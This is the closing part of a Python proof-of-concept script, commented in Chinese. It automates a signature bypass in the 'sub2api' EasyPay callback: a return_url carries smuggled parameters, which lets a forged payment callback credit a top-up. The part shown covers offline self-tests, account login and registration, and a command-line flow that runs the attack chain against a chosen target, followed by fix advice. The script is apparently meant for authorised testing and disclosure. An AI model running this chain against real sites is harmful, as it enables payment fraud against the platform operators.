        results.append(("干净 return_url 被拒", clean_ok))
        if not clean_ok:
            ui.debug(clean_detail)
    finally:
        srv.terminate()
        try:
            srv.wait(timeout=5)
        except Exception:
            srv.kill()

    ui._c("\n" + "-" * 64, "cyan")
    ok = True
    for name, passed in results:
        (ui.ok if passed else ui.fail)(name)
        ok = ok and passed
    ui._c("-" * 64, "cyan")
    if ok:
        ui._c("[+] 真实源码端到端自检通过：正向成立，反向对照均被正确拒绝。", "green")
    else:
        ui._c("[-] 真实源码端到端自检存在失败项。", "red")
    return 0 if ok else 1


def _negative_clean_return_url(ui, client):
    """用『未投毒的 return_url』下单，再按同样方式伪造 —— 签名必须对不上。

    这条对照是必要的: 它证明正向链之所以成立，是因为 return_url 走私造成的，
    而不是『凡是这个形状的回调都被接受』。
    """
    clean_url = client.base + "/payment/result"
    try:
        order = client.create_order(5.00, "alipay", clean_url) or {}
    except ApiError as e:
        return False, f"干净 return_url 下单失败: {e}"
    pay_url = order.get("pay_url") or ""
    if not pay_url:
        return False, "下单没有返回 pay_url"
    try:
        raw, _info = build_forged_callback(pay_url)
    except ForgeError:
        # 干净 return_url 里本来就没有注入标记 —— 正是期望的情形
        return True, ""
    st, _, _ = client.webhook_easypay_raw(raw)
    return st == 400, f"干净 return_url 的伪造竟然被接受 (HTTP {st})"


def run_selftest(ui):
    """起 3 个本地模拟服务端: 漏洞版 / 白名单修复版 / query剥离修复版, 分别跑完整链"""
    scenarios = [
        ("场景A: 未修复服务端 (应为 VULNERABLE)", _EmuState(), VULNERABLE),
        ("场景B: 已加回调白名单 (应为 NOT_VULNERABLE)", _EmuState(patched_whitelist=True),
         NOT_VULNERABLE),
        ("场景C: 已剥离 return_url query (应为 NOT_VULNERABLE)",
         _EmuState(patched_strip_query=True), NOT_VULNERABLE),
    ]
    all_pass = True
    for title, state, expect in scenarios:
        ui._c("\n" + "-" * 64)
        ui._c(title, "cyan")
        ui._c("-" * 64)
        server = ThreadingHTTPServer(("127.0.0.1", 0), make_emu_handler(state))
        threading.Thread(target=server.serve_forever, daemon=True).start()
        base = f"http://127.0.0.1:{server.server_address[1]}"
        try:
            client = Sub2ApiClient(base)
            client.login("poc@selftest.local", "whatever")
            client.token = "selftest-token"
            result, evidence = run_exploit(client, ui, amount=1.0, methods=["alipay"])
            ui.verdict(result, evidence)
            got = result["verdict"]
            if got == expect:
                ui.ok(f"符合预期: {got}")
            else:
                ui.fail(f"不符合预期: 期望 {expect}, 实际 {got}")
                all_pass = False
        finally:
            server.shutdown()
            server.server_close()
    ui._c("")
    if all_pass:
        ui._c("[+] 自测全部通过: PoC 的攻击构造与三种判定路径均正确。", "green")
    else:
        ui._c("[-] 自测存在失败项, 请检查脚本。", "red")
    return 0 if all_pass else 1


# ----------------------------------------------------------------------------
# 交互流程
# ----------------------------------------------------------------------------
def do_auth(client, ui, args):
    """登录或注册, 返回用户信息 dict"""
    if args.register:
        ui.step(0, 5, "注册新账户")
        email = args.email or ui.ask("注册邮箱", default=f"poc_{rand_str(8)}@example.com")
        password = args.password or ui.ask("注册密码", default="Poc!" + rand_str(10),
                                           password=True)
        try:
            data = client.register(email, password)
        except ApiError as e:
            text = f"{e} {e.reason}".lower()
            if "verify" in text or "verification" in text or "验证" in text:
                ui.warn("目标要求邮箱验证码, 正在发送 ...")
                client.send_verify_code(email)
                code = ui.ask("请输入收到的邮箱验证码")
                data = client.register(email, password, verify_code=code)
            elif "captcha" in text or "turnstile" in text:
                raise ApiError(
                    "目标启用了人机验证(turnstile/captcha)。本工具不会去绕过它；"
                    "请手工登录后改用浏览器 Cookie。", reason="captcha") from e
            else:
                raise
        client.token = (data or {}).get("access_token")
        ui.ok(f"注册成功: {email}")
        return client.me()

    ui.step(0, 5, "登录")
    email = args.email or ui.ask("登录邮箱")
    password = args.password or ui.ask("登录密码", password=True)
    data = client.login(email, password)
    if isinstance(data, dict) and data.get("requires_2fa"):
        temp = data.get("temp_token") or ""
        masked = data.get("user_email_masked") or email
        ui.warn(f"该账户启用了两步验证 ({masked})")
        code = (args.totp or ui.ask("请输入 6 位验证码", default="")).strip()
        if not re.fullmatch(r"\d{6}", code):
            raise ApiError("2FA 验证码格式不对（应为 6 位数字）。")
        data = client.login_2fa(temp, code)
        ui.ok("两步验证通过")
    client.token = (data or {}).get("access_token")
    if not client.token:
        raise ApiError("登录响应中没有 access_token")
    me = client.me()
    ui.ok(f"登录成功: {me.get('email', email)}")
    return me


def get_checkout_info(client, ui):
    """获取收银台信息 (支付方式 + 全局限额), 失败时返回空 dict"""
    try:
        return client.checkout_info() or {}
    except ApiError as e:
        ui.warn(f"获取收银台信息失败: {e}, 使用默认 [alipay, wxpay]")
        return {}


def pick_methods(args, info):
    if args.method:
        return [args.method]
    methods = []
    m = info.get("methods")
    if isinstance(m, dict):
        methods = list(m.keys())
    elif isinstance(m, list):
        methods = [x.get("type") if isinstance(x, dict) else str(x) for x in m]
    methods = [m for m in methods if m]
    for fallback in ("alipay", "wxpay"):
        if fallback not in methods:
            methods.append(fallback)
    return methods


def main():
    ap = argparse.ArgumentParser(
        description="sub2api 易支付回调验签绕过全自动 PoC (issue #7881) - 仅限授权测试")
    ap.add_argument("--target", help="目标站点, 如 https://example.com")
    ap.add_argument("--token", help="直接使用已有 access_token (跳过登录)")
    ap.add_argument("--email", help="账户邮箱")
    ap.add_argument("--password", help="账户密码")
    ap.add_argument("--register", action="store_true", help="注册新账户而不是登录")
    ap.add_argument("--amount", type=float, default=None,
                    help="充值(漏洞利用)金额, 不指定则交互式询问")
    ap.add_argument("--method", help="指定 payment_type (默认自动探测)")
    ap.add_argument("--selftest", action="store_true",
                    help="离线自测: 本地模拟漏洞/修复服务端, 验证 PoC 逻辑")
    ap.add_argument("--totp", help="两步验证码 (6 位数字); 不给则交互式询问")
    ap.add_argument("--selftest-real", action="store_true",
                    help="用真实 easypay.go 源码跑端到端自检 (需要 Go)")
    ap.add_argument("--insecure", action="store_true", help="跳过 TLS 证书校验")
    ap.add_argument("--plain", action="store_true", help="禁用 rich, 使用纯文本输出")
    ap.add_argument("--yes", action="store_true", help="跳过执行前确认")
    ap.add_argument("--timeout", type=int, default=20, help="HTTP 超时秒数")
    ap.add_argument("--verbose", "-v", action="store_true", help="打印原始报文细节")
    args = ap.parse_args()

    ui = UI(plain=args.plain, verbose=args.verbose)
    ui.banner()

    if args.selftest:
        return run_selftest(ui)

    if args.selftest_real:
        return run_selftest_real(ui)

    # --- 配置 ---
    target = normalize_base(args.target or ui.ask("目标站点 URL", default="http://127.0.0.1:8080"))
    if not target:
        ui.fail("目标不能为空")
        return 2

    client = Sub2ApiClient(target, timeout=args.timeout, insecure=args.insecure)
    try:
        do_auth(client, ui, args)
        info = get_checkout_info(client, ui)
        methods = pick_methods(args, info)
        ui.info("将依次尝试支付通道: " + ", ".join(methods))

        # 金额: 命令行 --amount 优先, 否则交互式询问 (附带平台限额提示)
        amount = args.amount
        if amount is None:
            amount = ask_amount(ui, limits=(info.get("global_min"), info.get("global_max")))
        if amount <= 0:
            ui.fail("金额必须为正数")
            return 2

        ui.show_kv([
            ("目标", target),
            ("模式", "注册新账户" if args.register else "登录已有账户"),
            ("充值金额", f"{amount:.2f}"),
            ("支付通道", args.method or "自动探测"),
        ], title="任务配置")

        if not args.yes and not ui.confirm("确认对该目标执行完整攻击链? (必须是你的站点或已获授权)"):
            ui.warn("已取消。")
            return 0

        result, evidence = run_exploit(client, ui, amount, methods)
    except ApiError as e:
        ui.fail(f"流程中断: {e}")
        return 1
    except KeyboardInterrupt:
        ui.warn("\n用户中断。")
        return 130

    ui.verdict(result, evidence)
    if result["verdict"] == VULNERABLE:
        ui._c("\n修复建议 (来自 issue #7881):", "yellow")
        ui._c("  1. CanonicalizeReturnURL 剥离用户 query (parsed.RawQuery = \"\")")
        ui._c("  2. VerifyNotification 增加回调参数白名单, 未知参数直接拒绝")
        ui._c("  3. (可选) 入账后异步向上游 api.php 复核订单")
        ui._c("  4. 升级前临时缓解: 易支付实例切换到非 popup (扫码/mapi) 模式")
    return 0


if __name__ == "__main__":
    sys.exit(main())
